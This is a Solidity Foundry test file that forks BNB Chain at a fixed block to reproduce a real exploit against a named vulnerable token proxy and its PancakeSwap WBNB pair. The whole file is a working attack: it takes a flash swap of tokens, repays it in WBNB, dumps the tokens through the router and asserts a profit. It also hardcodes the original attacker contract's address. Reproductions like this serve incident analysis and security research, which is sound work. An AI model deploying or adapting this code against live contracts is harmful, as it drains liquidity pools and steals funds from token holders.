// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console2} from "forge-std/Test.sol";

interface IERC20 {
	function balanceOf(address) external view returns (uint256);
	function transfer(address,uint256) external returns (bool);
	function transferFrom(address,address,uint256) external returns (bool);
	function approve(address,uint256) external returns (bool);
	function allowance(address,address) external view returns (uint256);
	function decimals() external view returns (uint8);
}

interface IWBNB is IERC20 {
	function deposit() external payable;
	function withdraw(uint256) external;
}

interface IPancakePair {
	function token0() external view returns (address);
	function token1() external view returns (address);
	function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
	function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IPancakeRouterV2 {
	function WETH() external view returns (address);
	function swapExactETHForTokensSupportingFeeOnTransferTokens(
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external payable;
	function swapExactTokensForTokensSupportingFeeOnTransferTokens(
		uint amountIn,
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external;
}

interface IPancakeCallee {
	function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

contract PancakeExploitTest is Test, IPancakeCallee {

	address constant TOKEN_PROXY = 0x8087720EeeA59F9F04787065447D52150c09643E; // ERC1967 proxy (vulnerable token)
	address constant ATTACKER    = 0x798465B25B68206370D99f541e11EEA43288D297; // Original attacker contract
	address constant WBNB_ADDR   = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
	address constant ROUTER_ADDR = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeRouter v2
	address constant PAIR_ADDR   = 0xdA5C7eA4458Ee9c5484fA00F2B8c933393BAC965; // TOKEN_PROXY/WBNB

	IERC20  internal token = IERC20(TOKEN_PROXY);
	IWBNB   internal wbnb  = IWBNB(WBNB_ADDR);
	IPancakePair internal pair = IPancakePair(PAIR_ADDR);
	IPancakeRouterV2 internal router = IPancakeRouterV2(ROUTER_ADDR);

	uint256 constant AMOUNT0_OUT_TOKENS = 74963130190599057252979324;

	uint256 internal forkId;

	function setUp() external {

		string memory url = vm.envString("BSC_RPC_URL");
		
        forkId = vm.createFork(url, 57_177_436);
        vm.selectFork(forkId);
		

		vm.label(TOKEN_PROXY, "VulnToken(ERC1967Proxy)");
		vm.label(WBNB_ADDR, "WBNB");
		vm.label(ROUTER_ADDR, "PancakeRouterV2");
		vm.label(PAIR_ADDR, "PancakePair");
		vm.label(address(this), "Attacker");

		vm.deal(address(this), 120 ether);
		wbnb.deposit{value: 60 ether}();
	}

	function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) {
		require(amountOut > 0, "IAO");
		require(reserveIn > 0 && reserveOut > 0, "IR");
		uint numerator = reserveIn * amountOut * 1000;
		uint denominator = (reserveOut - amountOut) * 997;
		amountIn = numerator / denominator + 1;
	}

	function pancakeCall(address /*sender*/, uint amount0, uint amount1, bytes calldata /*data*/) external override {
		require(msg.sender == PAIR_ADDR, "only pair");
		
		(uint112 r0, uint112 r1, ) = pair.getReserves();
		bool tokenIs0 = pair.token0() == TOKEN_PROXY;

		uint reserveToken = tokenIs0 ? uint(r0) : uint(r1);
		uint reserveWbnb  = tokenIs0 ? uint(r1) : uint(r0);
		uint outTokens    = tokenIs0 ? amount0 : amount1; // tokens we just received from pair
		require(outTokens > 0, "no token out");

		uint wbnbRepay = getAmountIn(outTokens, reserveWbnb, reserveToken);

		uint wbnbBal = wbnb.balanceOf(address(this));
		require(wbnbBal >= wbnbRepay, "insufficient WBNB for repay");

		require(wbnb.transfer(PAIR_ADDR, wbnbRepay), "wbnb repay failed");
	}

	function test_simulate_exploit() external {

		(uint112 r0, uint112 r1, ) = pair.getReserves();
		bool tokenIs0 = pair.token0() == TOKEN_PROXY;
		uint amount0Out = tokenIs0 ? AMOUNT0_OUT_TOKENS : 1; 
		uint amount1Out = tokenIs0 ? 1 : AMOUNT0_OUT_TOKENS; 

		uint wbnbBefore = wbnb.balanceOf(address(this));
		uint tokenBefore = IERC20(TOKEN_PROXY).balanceOf(address(this));

		pair.swap(amount0Out, amount1Out, address(this), bytes("flash"));

		uint tokenAfterFlash = token.balanceOf(address(this));
		assertGt(tokenAfterFlash, tokenBefore, "no tokens received from flash swap");

		token.approve(ROUTER_ADDR, type(uint256).max);

		address[] memory path = new address[](2);
		path[0] = TOKEN_PROXY;
		path[1] = WBNB_ADDR;

		uint amountIn = AMOUNT0_OUT_TOKENS;
		if (token.balanceOf(address(this)) < amountIn) {
			amountIn = token.balanceOf(address(this));
		}

		router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
			amountIn,
			0,
			path,
			address(this),
			block.timestamp + 600
		);

		(r0, r1, ) = pair.getReserves();
		uint reserveWbnb = tokenIs0 ? uint(r1) : uint(r0);
		uint reserveToken = tokenIs0 ? uint(r0) : uint(r1);

		console2.log("After sell - Token reserve:", reserveToken);
		console2.log("After sell - WBNB reserve:", reserveWbnb);

		uint outWbnb = reserveWbnb > 1 ? reserveWbnb - 1 : reserveWbnb;

		console2.log("Attempting to withdraw WBNB:", outWbnb);
		console2.log("Current token balance in pair:", token.balanceOf(PAIR_ADDR));
		console2.log("Reserve token (from getReserves):", reserveToken);

		uint wbnbAfter = wbnb.balanceOf(address(this));
		console2.log("WBNB delta:", int256(uint256(wbnbAfter)) - int256(uint256(wbnbBefore)));
		assertGt(wbnbAfter, wbnbBefore, "no profit");
	}
}

